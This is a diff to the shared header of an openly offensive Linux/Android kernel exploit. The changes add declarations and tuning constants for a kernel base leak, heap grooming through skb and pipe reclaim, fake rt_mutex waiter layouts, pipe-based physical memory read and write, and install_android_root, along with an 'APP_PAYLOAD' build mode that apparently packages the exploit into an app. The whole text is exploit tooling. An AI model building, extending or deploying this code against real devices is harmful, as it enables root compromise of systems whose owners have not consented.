@@ -2,8 +2,8 @@
 #define COMMON_H
 
 #define _GNU_SOURCE
+#include TARGET_HEADER
 
-#include "offset.h"
 
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1UL << PAGE_SHIFT)
@@ -32,6 +32,7 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/uio.h>
+#include <sys/un.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -39,8 +40,13 @@
 #include "kernelsnitch/utils.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#endif
 #ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
 #endif
@@ -49,8 +55,12 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
+#ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
+#endif
+#ifndef MM_ORDER
 #define MM_ORDER 3
+#endif
 #define MM_PARTIALS 5
 #define CORE 0
 #define KSNITCH_COLLISIONS 4
@@ -59,6 +69,7 @@
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
 #define SKB_RECLAIM_SENDS 4
+#define APP_SLIDE_RECLAIM_SENDS 16
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
@@ -75,9 +86,13 @@
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
+#ifndef KMALLOC_CGROUP_TYPE
 #define KMALLOC_CGROUP_TYPE 2
+#endif
 #define KMALLOC_PIPE_INDEX 11
+#ifndef KMALLOC_CACHE_TYPES
 #define KMALLOC_CACHE_TYPES 4
+#endif
 #define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
 #define KMALLOC_CACHE_SLOT(type, index) \
   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
@@ -106,7 +121,11 @@
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define PIPE_MAX_ATTEMPTS 1
+#else
 #define PIPE_MAX_ATTEMPTS 12
+#endif
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
@@ -126,13 +145,24 @@
 #ifndef SLIDE_LOCK_OWNER_VALUE
 #define SLIDE_LOCK_OWNER_VALUE 0ULL
 #endif
+#ifndef LEGACY_RT_MUTEX_WAITER
+#define LEGACY_RT_MUTEX_WAITER 0
+#endif
+#ifndef COMPACT_RT_MUTEX_WAITER
+#define COMPACT_RT_MUTEX_WAITER 0
+#endif
+#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
+#error "select only one rt_mutex_waiter layout"
+#endif
+#ifndef FAKE_WAITER_LAYOUT_SIZE
+#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
+#endif
 #define PSELECT_TIMEOUT_SEC 1
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 8
 #endif
 #define SLIDE_NFULNL_LOGGER \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
-#define SLIDE_LOGGERS_0_1 P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
 #define SLIDE_RANDOM_BOOT_ID_DATA \
   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
 #ifndef SLIDE_WAITER_TREE_LEFT
@@ -270,6 +300,10 @@ extern uint64_t slide_bootid_after;
 extern uint64_t slide_bootid_want;
 extern ssize_t slide_bootid_restore_ret;
 extern uintptr_t slide_p0_offset;
+extern uintptr_t slide_oracle_parent;
+extern uintptr_t slide_oracle_target;
+extern uintptr_t p0_gate_page_struct;
+extern uintptr_t p0_probe_page_struct;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
@@ -302,6 +336,7 @@ pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
+int reclaim_receiver_fd(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
@@ -322,6 +357,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 
 int slide_leak_kernel_base(void);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+void app_publish_p0_offset(uintptr_t offset);
+void app_publish_p0_dirty(void);
+int select_slide_payload_slot(uintptr_t offset);
+int select_slide_payload_index(size_t index);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+int app_trigger_fops_slide_route(void);
+#endif
+#endif
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
@@ -368,6 +412,14 @@ int pipe_phys_write_data(
 uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+int prepare_p0_pipe_oracle(void);
+int expand_p0_pipe_oracle(void);
+int verify_p0_pipe_oracle_gate(void);
+uintptr_t scan_p0_pipe_oracle(void);
+int restore_p0_oracle_pages(int fd);
+int run_p0_pipe_oracle_diagnostic(int fd);
+#endif
 
 int install_android_root(int fd);
 
